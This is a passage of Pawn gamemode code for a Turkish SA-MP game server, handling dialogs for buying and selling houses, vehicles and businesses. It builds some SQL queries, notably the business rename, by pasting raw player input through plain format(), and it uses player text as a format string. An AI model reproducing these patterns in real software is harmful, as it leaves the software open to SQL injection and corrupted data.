Dialog_ChangeHouseName(playerid, response, inputtext[])
{
	// Just close the dialog if the player clicked "Cancel" or if the player didn't input any text
	if ((!response) || (strlen(inputtext) == 0)) return 1;

	// Change the name of the house
	format(AHouseData[APlayerData[playerid][CurrentHouse]][HouseName], 100, inputtext);
	// Also update the 3DText at the entrance of the house
	House_UpdateEntrance(APlayerData[playerid][CurrentHouse]);
	// Let the player know that the name of his house has been changed
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_ChangedHouseName);

	// Save the player-file (and his houses)
	Oyuncu_Kaydet(playerid);

	return 1;
}

// Choose a vehicle class from which to buy a vehicle
Dialog_BuyCarClass(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new CarList[1000], DialogTitle[128];

	// Set the player's chosen vehicle-class based on the listitem he chose (add 1 as the vehicleclass starts at 1)
	APlayerData[playerid][DialogBuyVClass] = listitem + 1;

	// Add all vehicles of the same class to the list
	for (new i; i < sizeof(ABuyableVehicles); i++)
	{
		// Check if the vehicle in the list has the same class as requested
		if (ABuyableVehicles[i][VehicleClass] == APlayerData[playerid][DialogBuyVClass])
		{
			// Add the carname to the list and it's price
			format(CarList, 1000, "%s%s%s ($%i)", CarList, "\n", ABuyableVehicles[i][CarName], ABuyableVehicles[i][Price]); // Add the name of the next car to the list on the next line
		}
	}

	// Check if the list is empty
	if (strlen(CarList) == 0)
	{
		// Send the player a message that all vehicles have been disabled of the chosen class (no vehicles in the array of this class)
		SendClientMessage(playerid, 0xFFFFFFFF, TXT_BuyRentCarEmptyList);
		// Exit the function (don't ask to choose a vehicle)
		return 1;
	}

	// Set a title for the dialog based on the requested vehicleclass
	switch (APlayerData[playerid][DialogBuyVClass])
	{
		case VClassBike: format(DialogTitle, 128, TXT_BuyBike);
		case VClassBoat: format(DialogTitle, 128, TXT_BuyBoat);
		case VClassConvertible: format(DialogTitle, 128, TXT_BuyConvertible);
		case VClassHelicopter: format(DialogTitle, 128, TXT_BuyHelicopter);
		case VClassIndustrial: format(DialogTitle, 128, TXT_BuyIndustrial);
		case VClassLowRider: format(DialogTitle, 128, TXT_BuyLowRider);
		case VClassOffRoad: format(DialogTitle, 128, TXT_BuyOffRoad);
		case VClassPlane: format(DialogTitle, 128, TXT_BuyPlane);
		case VClassPublic: format(DialogTitle, 128, TXT_BuyPublicService);
		case VClassRCVehicle: format(DialogTitle, 128, TXT_BuyRC);
		case VClassSaloons: format(DialogTitle, 128, TXT_BuySaloon);
		case VClassSportCar: format(DialogTitle, 128, TXT_BuySport);
		case VClassStationCar: format(DialogTitle, 128, TXT_BuyStationWagon);
		case VClassTrailer: format(DialogTitle, 128, TXT_BuyTrailer);
		case VClassUnique: format(DialogTitle, 128, TXT_BuyUnique);
	}

	// Ask which car the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogBuyCar, DIALOG_STYLE_LIST, DialogTitle, CarList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

	return 1;
}

// Buy a vehicle and assign it to the house
Dialog_BuyCar(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Counter, Msg[128], cComponents[14];

	// Get the HouseID
	new HouseID = APlayerData[playerid][CurrentHouse];

	// Loop through the entire list of buyable vehicles
	for (new i; i < sizeof(ABuyableVehicles); i++)
	{
		// Check if the vehicle in the list has the same class as requested
		if (ABuyableVehicles[i][VehicleClass] == APlayerData[playerid][DialogBuyVClass])
		{
		    // Check if this is the vehicle that the player chose
		    if (Counter == listitem)
			{
			    // Check if the player has enough money to afford buying this vehicle
			    if (APlayerData[playerid][PlayerMoney] >= (ABuyableVehicles[i][Price]))
			    {
					// Add the vehicle to the house (this sets ownership and other data that's needed)
					// The vehicles are by default created inside the hangar of KACC Military Fuels instead of near the EasterBoard Farm
					House_AddVehicle(HouseID, ABuyableVehicles[i][CarModel], 0, cComponents, 2069.2952, 15000.3223, 21.7712, 0.0, -1, -1);
                    HouseFile_Save(HouseID);

					// Let the player pay for buying the vehicle
					APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] - ABuyableVehicles[i][Price];
					// Let the player know he bought a vehicle
					format(Msg, 128, TXT_PlayerBoughtVehicle, ABuyableVehicles[i][CarName], ABuyableVehicles[i][Price]);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerMustUseGetcarAndPark);

					// Save the player-file (and his houses)
					Oyuncu_Kaydet(playerid);
				}
				else // The player has not enough money to buy this vehicle
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_CannotAffordVehicle);

				// Stop looking for the vehicle, as it's found and given to the player already
				return 1;
			}
		    else // The player chose another vehicle from the same class, keep looking for another one
		        Counter++;
		}
	}

	return 1;
}

// Buy insurance for the house's vehicles
Dialog_BuyInsurance(playerid, response)
{
	// Just close the dialog if the player clicked "No"
	if(!response) return 1;
	SendClientMessage(playerid, -1, "{FF0000}Týrcýlar Mekaný Build 167'de araç sigortasý sistemi kaldýrýlmýþtýr.");
/*
	// Setup local variables
	new Msg[128];

	// Get the HouseID where the player is right now
	new HouseID = APlayerData[playerid][CurrentHouse];

	// Buy an insurance for this house's vehicles (insurance costs 10% of the house's baseprice)
	AHouseData[HouseID][Insurance] = 1;
	RewardPlayer(playerid, -(AHouseData[HouseID][HousePrice] / 10), 0);

	// Let the player know he has bought a vehicle-insurance for this house
	format(Msg, 128, TXT_PlayerBoughtInsurance, AHouseData[HouseID][HousePrice] / 10);
	SendClientMessage(playerid, 0xFFFFFFFF, Msg);

	// Save the player-file (and his houses)
	Oyuncu_Kaydet(playerid);
	// Also save the sold house, otherwise the old ownership-data is still there
	HouseFile_Save(HouseID);
*/
	return 1;
}

// Sell the house
Dialog_SellHouse(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Get the HouseID where the player is right now
	new HouseID = APlayerData[playerid][CurrentHouse];

	// Set the player in the normal world again
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	// Set the position of the player at the entrance of his house
	SetPlayerPos(playerid, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]);

	// Also clear the tracking-variable to track in which house the player is
	APlayerData[playerid][CurrentHouse] = 0;

	// Clear the owner of the house
	AHouseData[HouseID][Owned] = false;
	AHouseData[HouseID][Owner] = 0;
	// Clear the house-name and house-level
	AHouseData[HouseID][HouseName] = 0;


	// Refund the player 50% of the worth of the house
	RewardPlayer(playerid, House_CalcSellPrice(HouseID), 0);
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerSoldHouse);

	AHouseData[HouseID][HouseLevel] = 1;

	// Clear the house-id from the player
	/*for (new i; i < MAX_HOUSESPERPLAYER; i++)
	{
		// If the house-slot if found where the house was added to the player
		if (APlayerData[playerid][Houses][i] == HouseID)
		{
		    // Clear the house-id
		    APlayerData[playerid][Houses][i] = 0;
		    // Stop searching
		    break;
		}
	}*/

	// Update the 3DText near the house's entrance to show other players that it's for sale again
	House_UpdateEntrance(HouseID);

	// Save the player-file (and his houses)
	Oyuncu_Kaydet(playerid);
	// Also save the sold house, otherwise the old ownership-data is still there
	HouseFile_Save(HouseID);

	return 1;
}



// Sell the house
Dialog_SellCar(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new HouseID = APlayerData[playerid][CurrentHouse];
	new vid = AHouseData[HouseID][VehicleIDs][listitem];

	// Check if there is a vehicle stored in this carslot
	if (vid != 0)
	{
		new BuyableCarIndex = VehicleBuyable_GetIndex(GetVehicleModel(vid));
		new vModel = AVehicleData[vid][Model];
		new Msg[128];

		// Destroy the vehicle and remove it from the house
		if(Flashing[vid] == true)
		{
	    	KillTimer(FlashTime[vid]);
	    	Flashing[vid] = false;
		}

		DestroyVehicle(vid);
		AHouseData[HouseID][VehicleIDs][listitem] = 0;
		// Also clear the data
		AVehicleData[vid][Owned] = false;
		AVehicleData[vid][Owner] = 0;
		AVehicleData[vid][Model] = 0;
		AVehicleData[vid][PaintJob] = 0;
		for (new i; i < 14; i++)
			AVehicleData[vid][Components][i] = 0;
		AVehicleData[vid][SpawnX] = 0.0;
		AVehicleData[vid][SpawnY] = 0.0;
		AVehicleData[vid][SpawnZ] = 0.0;
		AVehicleData[vid][SpawnRot] = 0.0;
		//DestroyDynamic3DTextLabel(AVehicleData[vid][VehicleText]);
        //AVehicleData[vid][VehicleText] = Text3D:-1;

		// Refund the player with 50% of the vehicle's buying price
		APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] + floatround(ABuyableVehicles[BuyableCarIndex][Price]/2);
		// Let the player know about it
		format(Msg, 128, TXT_PlayerSoldVehicle, ABuyableVehicles[BuyableCarIndex][CarName], floatround(ABuyableVehicles[BuyableCarIndex][Price]/2));
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

		format(Msg, 128, "%s, %s'ini %d$'a satti", GetName(playerid), VehNames[vModel-400], floatround(ABuyableVehicles[BuyableCarIndex][Price]/2));
		CAHITLOG(Msg);

		// Save the player-file (and his houses)
		Oyuncu_Kaydet(playerid);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoVehicleInSlot);

	return 1;
}

// This dialog processes the selected house from which to get a vehicle using /getcar
Dialog_GetCarSelectHouse(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Get the houseid based on the chosen listitem
	new HouseID = APlayerData[playerid][Houses][listitem];

	// Check if it was a valid house
	if (HouseID != 0)
	{
		// Setup local variables
	    new BuyableCarIndex, VehicleList[500], bool:HouseHasCars = false, CarSlot;

		// Store the HouseID, otherwise the next dialog won't be able to get a car from the chosen house
		APlayerData[playerid][DialogGetCarHouseID] = HouseID;

		// Check if the house has any cars assigned to it
		for (CarSlot = 0; CarSlot < 11; CarSlot++)
			if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
			    HouseHasCars = true;

		// Check if the house has any cars assigned to it
		if (HouseHasCars == true)
		{
			// Add all vehicles to the list
			for (CarSlot = 0; CarSlot < 11; CarSlot++)
			{
				// Check if the carslot has a vehicle in it
				if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
				{
				    // Get the index where the first vehicle is found in the ABuyableVehicles array
				    BuyableCarIndex = VehicleBuyable_GetIndex(GetVehicleModel(AHouseData[HouseID][VehicleIDs][CarSlot]));
				    // Add the name of the vehicle to the list
					if (AVehicleData[AHouseData[HouseID][VehicleIDs][CarSlot]][Clamped] == true)
					    format(VehicleList, 500, "%s{00FF00}%s (clamped)\n", VehicleList, ABuyableVehicles[BuyableCarIndex][CarName]);
					else
					    format(VehicleList, 500, "%s{00FF00}%s\n", VehicleList, ABuyableVehicles[BuyableCarIndex][CarName]);
				}
				else
					format(VehicleList, 500, TXT_EmptyCarSlot, VehicleList);
			}

			// Ask which vehicle the player wants to teleport to his location
			ShowPlayerDialog(playerid, DialogGetCarSelectCar, DIALOG_STYLE_LIST, TXT_SelectVehicleToGet, VehicleList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoHouseVehicles);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoHouseInSlot);

	return 1;
}

// This dialog processes the chosen car and spawns it at the player's location
Dialog_GetCarSelectCar(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Get the HouseID from which to get the car
	new HouseID = APlayerData[playerid][DialogGetCarHouseID];

	// Get the vehicleid from the chosen listitem
	new vid = AHouseData[HouseID][VehicleIDs][listitem];

	// Check if it was a valid vehicleid
	if (vid != 0)
	{
		// Check if the vehicle is clamped
		if (AVehicleData[vid][Clamped] == false)
		{
			// Setup local variables
			new Float:x, Float:y, Float:z, Float:Angle;
			// Get the player's position
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, Angle);
			// Port the vehicle to the player
			SetVehiclePos(vid, x, y, z);
			// Put the player inside the vehicle and rotate the vehicle to face where the player was facing
			PutPlayerInVehicle(playerid, vid, 0);
			SetVehicleZAngle(vid, Angle);
			// Turn on the engine and lights
			new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, engine, 1, alarm, doors, bonnet, boot, objective);
			// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
			GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
			APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
			// Let the player know he should park the vehicle
			SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerMustUsePark);
		}
		else // Inform the player that this vehicle is clamped and how he can un-clamp it
		{
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_SpeedometerClampedVehicle);
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_SpeedometerClampedVehicle2);
		}
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoVehicleInSlot);

	return 1;
}



// This dialog processes the chosen business-type and creates the business

Dialog_CreateBusSelType(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

    // Setup some local variables
	new BusType, BusID, Float:x, Float:y, Float:z, Msg[128], bool:EmptySlotFound = false;

	// Get the player's position
	GetPlayerPos(playerid, x, y, z);

	// Get the business-type from the option the player chose
	BusType = listitem + 1;

	// Find a free business-id
	for (BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if this business ID is free
		if (ABusinessData[BusID][BusinessType] == 0)
		{
			EmptySlotFound = true;
		    break; // Stop processing
		}
	}

	// Check if an empty slot has been found
	if (EmptySlotFound == false)
	{
		// If no empty slot was found, let the player know about it and exit the function
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Zaten Isyeri Limitine ulastiniz");
		return 1;
	}

	new query[512];
	mysql_format(Connection, query, sizeof(query), "INSERT INTO isyerleri SET ID='%d',X='%f',Y='%f',Z='%f',Type='%d',Level='1',Kasa='0',Sahipli='0',Sahip='-'", BusID, x, y, z, BusType);
	mysql_query(Connection, query);

	// Set some default data at the index of NextFreeBusinessID (NextFreeBusinessID will point to the next free business-index)
	ABusinessData[BusID][BusinessX] = x;
	ABusinessData[BusID][BusinessY] = y;
	ABusinessData[BusID][BusinessZ] = z;
	ABusinessData[BusID][BusinessType] = BusType;
	/*ABusinessData[BusID][BusinessLevel] = 1;*/
	ABusinessData[BusID][Owned] = false;

	// Add the pickup and 3DText at the location of the business-entrance (where the player is standing when he creates the business)
	Business_CreateEntrance(BusID);

	// Save the business
	//BusinessFile_Save(BusID);

	// Inform the player that he created a new house
	format(Msg, 128, "{00CED1}%d ID'li {ADFF2F}iþyerini oluþturdunuz.", BusID);
	SendClientMessage(playerid, 0xFFFFFFFF, Msg);

	return 1;
}

// This function processes the businessmenu dialog
Dialog_BusinessMenu(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new BusID, BusType, Msg[128], DialogTitle[200], UpgradePrice;

	// Get the HouseID of the house where the player is
	BusID = APlayerData[playerid][CurrentBusiness];
	BusType = ABusinessData[BusID][BusinessType];

	// Select an option based on the selection in the list
	switch(listitem)
	{
	    case 0: // Change business name
	    {
	        format(DialogTitle, 200, TXT_DialogOldBusinessName, ABusinessData[BusID][BusinessName]);
			ShowPlayerDialog(playerid, DialogBusinessNameChange, DIALOG_STYLE_INPUT, DialogTitle, TXT_DialogEnterNewBusinessName, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
	    }
	    case 1: // Upgrade the business
	    {
			new query[128];

			new bLevel, Cache: get_isyeri, rows;
			mysql_format(Connection, query, sizeof(query), "SELECT Level FROM isyerleri WHERE ID = '%d'", BusID);
			get_isyeri = mysql_query(Connection, query);
			rows = cache_num_rows();

			if(rows)
			{
				for(new i; i < rows; ++i)
				{
					cache_get_value_name_int(i, "Level", bLevel);
				}
			}

			cache_delete(get_isyeri);
					
	        // Check if it's possible to upgrade further
			if (bLevel < 5)
			{
			    // Get the upgrade-price
			    UpgradePrice = ABusinessInteriors[BusType][BusPrice];
			    // Check if the player can afford the upgrade
				if (APlayerData[playerid][PlayerMoney] >= UpgradePrice)
				{
				    // Give the current earnings of the business to the player and update the LastTransaction time
					Business_PayEarnings(playerid, BusID);
					// Upgrade the business 1 level
					format(query, 128, "UPDATE isyerleri SET Level=Level+1 WHERE ID = %d", BusID);
					mysql_query(Connection, query);
				    //ABusinessData[BusID][BusinessLevel]++;
					// Let the player pay for the upgrade
					RewardPlayer(playerid, -UpgradePrice, 0);
					// Update the 3DText near the business's entrance to show what level the business is
					Business_UpdateEntrance(BusID);
					//BusinessFile_Save(BusID);
					// Let the player know about it
					format(Msg, 128, "{00FF00}Ýþyerinizi {FFFF00}%i {00FF00}levele yükselttiniz", bLevel+1);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
				else
					SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Yükseltme yapacak paranýz yok");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_BusinessReachedMaxLevel);
	    }
		case 2: // Retrieve business earnings
		{
		    // Give the current earnings of the business to the player and update the LastTransaction time
			Business_PayEarnings(playerid, BusID);
		}
		case 3: // Sell business
		{
		 	new query[128];

			new bLevel, Cache: get_isyeri, rows;
			mysql_format(Connection, query, sizeof(query), "SELECT Level FROM isyerleri WHERE ID = '%d'", BusID);
			get_isyeri = mysql_query(Connection, query);
			rows = cache_num_rows();

			if(rows)
			{
				for(new i; i < rows; ++i)
				{
					cache_get_value_name_int(i, "Level", bLevel);
				}
			}

			cache_delete(get_isyeri);

		    format(Msg, 128, TXT_SureSellBusiness, floatround( ABusinessInteriors[BusType][BusPrice] * bLevel * 0.5 ));
			ShowPlayerDialog(playerid, DialogSellBusiness, DIALOG_STYLE_MSGBOX, TXT_AreYouSure, Msg, TXT_DialogButtonYes, TXT_DialogButtonNo);

			format(Msg, 128, "[SATIS] NICK : %s  -- ISYERI : %d-%s -- FIYAT : $%d", GetName(playerid),BusID,ABusinessInteriors[BusType][InteriorName],ABusinessInteriors[BusType][BusPrice]);
			ISYERILOG(Msg);
		}
	    case 4: // Exit the business
	    {
			Business_Exit(playerid, BusID);
	    }
	}

	return 1;
}

// This function processes the /gobus dialog
Dialog_GoBusiness(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new BusIndex, BusID;

	// The listitem directly indicates the business-index
	BusIndex = listitem;
	BusID = APlayerData[playerid][Business][BusIndex];

	// Check if this is a valid business (BusID != 0)
	if (BusID != 0)
	{
		// Get the coordinates of the business's entrance
		SetPlayerPos(playerid, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NoBusinessInSlot);

	return 1;
}

// Let the player change the name of his business
Dialog_ChangeBusinessName(playerid, response, inputtext[])
{
	// Just close the dialog if the player clicked "Cancel" or if the player didn't input any text
	if ((!response) || (strlen(inputtext) == 0)) return 1;

	// Change the name of the business
	new query[256];
	format(query, 256, "UPDATE isyerleri SET Isim='%s' WHERE ID = %d", inputtext, APlayerData[playerid][CurrentBusiness]);
	mysql_query(Connection, query);
	//format(ABusinessData[APlayerData[playerid][CurrentBusiness]][BusinessName], 100, inputtext);
	// Also update the 3DText at the entrance of the business
	Business_UpdateEntrance(APlayerData[playerid][CurrentBusiness]);
	// Let the player know that the name of his business has been changed
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_ChangedBusinessName);
    //BusinessFile_Save(APlayerData[playerid][CurrentBusiness]);

	// Save the player-file (and his houses and businesses)
	Oyuncu_Kaydet(playerid);

	return 1;
}

// Sell the business
Dialog_SellBusiness(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Get the BusinessID where the player is right now and the business-type
	new BusID = APlayerData[playerid][CurrentBusiness];
	new BusType = ABusinessData[BusID][BusinessType];

	// Set the player in the normal world again
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	// Set the position of the player at the entrance of his business
	SetPlayerPos(playerid, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]);

	// Also clear the tracking-variable to track in which business the player is
	APlayerData[playerid][CurrentBusiness] = 0;

	/*
	// Clear the owner of the business
	ABusinessData[BusID][Owned] = false;
	ABusinessData[BusID][Owner] = 0;
	// Clear the house-name and business-level
	ABusinessData[BusID][BusinessName] = 0;
	*/
    
	new query[512];

	new bLevel, Cache: get_isyeri, rows;
	mysql_format(Connection, query, sizeof(query), "SELECT Level FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
		{
			cache_get_value_name_int(i, "Level", bLevel);
		}
	}

	cache_delete(get_isyeri);

	format(query, 512, "UPDATE isyerleri SET Isim='%s',Level='1',Kasa='0',Sahipli='0',Sahip='-' WHERE ID = %d", ABusinessInteriors[BusType][InteriorName], BusID);
	mysql_query(Connection, query);

    ABusinessData[BusID][Owned] = false;
    
	// Refund the player 50% of the worth of the business
	RewardPlayer(playerid, floatround( ABusinessInteriors[BusType][BusPrice] * bLevel * 0.5 ), 0);
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerSoldBusiness);

   	//ABusinessData[BusID][BusinessLevel] = 1;

	// Clear the house-id from the player
	/*for (new i; i < MAX_BUSINESSPERPLAYER; i++)
	{
		// If the business-slot if found where the business was added to the player
		if (APlayerData[playerid][Business][i] == BusID)
		{
		    // Clear the business-id
		    APlayerData[playerid][Business][i] = 0;
		    // Stop searching
		    break;
		}
	}*/

	// Update the 3DText near the business's entrance to show other players that it's for sale again
	Business_UpdateEntrance(BusID);

	// Save the player-file (and his houses and businesses)
	Oyuncu_Kaydet(playerid);
	// Also save the sold business, otherwise the old ownership-data is still there
	//BusinessFile_Save(BusID);

	return 1;
}

// Process the commands dialog
/*
Dialog_PlayerCommands(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		// Reset the FirstCommand (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogFirstItem] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 11: // Player chooses "Next..."
		{
		    // Add 5 to the FirstCommand, so the list will start further down the array (will show the next 5 commands)
		    APlayerData[playerid][DialogFirstItem] = APlayerData[playerid][DialogFirstItem] + 5;
		    // Create a new list of commands and show the dialog
		    CommandList_Create(playerid);
		}
	}

	return 1;
}
*/

Dialog_PlayerCommands(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		// Reset the FirstCommand (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogFirstItem] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 8: // Player chooses "Next..."
		{
		    // Add 5 to the FirstCommand, so the list will start further down the array (will show the next 5 commands)
		    APlayerData[playerid][DialogFirstItem] = APlayerData[playerid][DialogFirstItem] + 8;
		    // Create a new list of commands and show the dialog
		    CommandList_Create(playerid);
		}
	}

	return 1;
}

// Process the primary car color dialog
Dialog_PrimaryCarColor(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new vid = GetPlayerVehicleID(playerid);
	new evoid = Araclar[vid][AracSHPID];
	
	// Save the primary car-color and apply the colors
	AVehicleData[vid][Color1] = listitem;
	AracSHP[evoid][ASHPRenk1] = listitem;
	ChangeVehicleColor(GetPlayerVehicleID(playerid), AracSHP[evoid][ASHPRenk1], AracSHP[evoid][ASHPRenk2]);
	// If the primary color is black, remove the paintjob
	if (listitem == 0)
	{
		AVehicleData[vid][PaintJob] = 0;
		AracSHP[evoid][ASHPPJ] = 3;
	}
	// Let the player pay $150 for changing the color
	RewardPlayer(playerid, -150, 0);
	SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}$150'a araç rengi deðiþtirildi.");

	return 1;
}

// Process the secundary car color dialog
Dialog_SedundaryCarColor(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new vid = GetPlayerVehicleID(playerid);
    new evoid = Araclar[vid][AracSHPID];
    
	// Save the primary car-color and apply the colors
	AVehicleData[vid][Color2] = listitem;
	AracSHP[evoid][ASHPRenk2] = listitem;
	ChangeVehicleColor(GetPlayerVehicleID(playerid), AracSHP[evoid][ASHPRenk1], AracSHP[evoid][ASHPRenk2]);

	// Let the player pay $150 for changing the color
	RewardPlayer(playerid, -150, 0);
	SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}$150'a araç rengi deðiþtirildi.");

	return 1;
}

// Process the unclamp dialog
Dialog_UnclampVehicles(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new HouseID, vid, ClampedVehicles, UnclampPrice, Msg[128];

    Player_LoadHouses(playerid);
	// Loop through all vehicles owned by this player
	for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
	{
		// Get the HouseID that exists on this index
		HouseID = APlayerData[playerid][Houses][HouseSlot];

		// Check if this house-slot is used
		if (HouseID != 0)
		{
			// Loop through all vehicles assigned to this house
			for (new CarSlot; CarSlot < 11; CarSlot++)
			{
				// Get the vehicle-id of the vehicle in this carslot
				vid = AHouseData[HouseID][VehicleIDs][CarSlot];

				// Check if this carslot is used
				if (vid != 0)
				{
					// Check if this vehicle is clamped
					if (AVehicleData[vid][Clamped] == true)
					    ClampedVehicles++; // Count the clamped vehicles
				}
			}
		}
	}

	// Calculate the price to unclamp all the player's vehicles
	UnclampPrice = ClampedVehicles * UnclampPricePerVehicle;

	// Check if the player has enough cash to unclamp his vehicles
	if (APlayerData[playerid][PlayerMoney] >= UnclampPrice)
	{
	    Player_LoadHouses(playerid);
		// Loop through all vehicles owned by this player
		for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
		{
			// Get the HouseID that exists on this index
			HouseID = APlayerData[playerid][Houses][HouseSlot];

			// Check if this house-slot is used
			if (HouseID != 0)
			{
				// Loop through all vehicles assigned to this house
				for (new CarSlot; CarSlot < 11; CarSlot++)
				{
					// Get the vehicle-id of the vehicle in this carslot
					vid = AHouseData[HouseID][VehicleIDs][CarSlot];

					// Check if this carslot is used
					if (vid != 0)
					{
						// Check if this vehicle is clamped
						if (AVehicleData[vid][Clamped] == true)
						    AVehicleData[vid][Clamped] = false; // Unclamp the vehicle
					}
				}
			}
		}

		// Remove the money from the player
		RewardPlayer(playerid, -UnclampPrice, 0);

		// Let the player know his vehicles have been unclamped
		format(Msg, 128, "{00FF00}Your vehicles have been unclamped for {FFFF00}$%i", UnclampPrice);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

		// Save the player's profile
		Oyuncu_Kaydet(playerid);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You don't have enough money to unclamp your vehicles");

	return 1;
}

// Process the rules dialog
Dialog_Rules(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Check if the player accepted the rules already
	if (APlayerData[playerid][RulesRead] == false)
	{
		// Reward the player with $5000 for accepting the rules
		RewardPlayer(playerid, 30000, 5);
		// Save that the player has accepted the rules
		APlayerData[playerid][RulesRead] = true;

		// Let the player know he earned some money for accepting the rules
		SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Kuralari okudugun icin {FFCC00}$30.000 + 5 Skor{FFFFFF} Kazandin");
		// Save the player's profile
		
		Oyuncu_Kaydet(playerid);
	}

	return 1;
}



// Process the dialog that displays statistics of another player (accessed through the scoreboard)
Dialog_StatsOtherPlayer(playerid, response, listitem)
{
	#pragma unused playerid
	#pragma unused response
	#pragma unused listitem
	// Just close the dialog if the player clicked "Cancel"
/*	if(!response) return 1;
	// Setup local variables
	new Name[24], DialogTitle[128], HouseList[1000], BusinessList[1000], BusID, BusType, Earnings, OtherPlayer, HouseID;
	// Get the ID of the other player
	OtherPlayer = APlayerData[playerid][DialogOtherPlayer];
	// If the player chose the line "Houses: xxx" or "Businesses: xxx", open a new dialog that displays them
	switch (listitem)
	{
		case 20: // Player chose to display the other player's houses
		{
			// Construct the dialog-title
			GetPlayerName(OtherPlayer, Name, sizeof(Name));
			format(DialogTitle, 128, " %s 'in Evi", Name);

			// Add all house-names of the other player to the list
			for (new i; i <= 1; i++)
			{
			    // Get the HouseID
			    HouseID = APlayerData[OtherPlayer][Houses][i];

				// Check if this houseindex is occupied
				if (HouseID != 0)
					format(HouseList, 1000, "%s{00FF00}%s{FFFFFF}\n", HouseList, AHouseData[HouseID][HouseName]);
     			// else	format(HouseList, 1000, "%s{FFFFFF}%s{FFFFFF}\n", HouseList, " BOS EV");
			}

			// Display the dialog (displays all statistics about the house, such as level, bought vehicles, insurance, ...)
			ShowPlayerDialog(playerid, DialogStatsHouse, DIALOG_STYLE_LIST, DialogTitle, HouseList, "Select", "Cancel");
		}
		case 21: // Player chose to display the other player's businesses
		{
			// Construct the dialog-title
			GetPlayerName(OtherPlayer, Name, sizeof(Name));
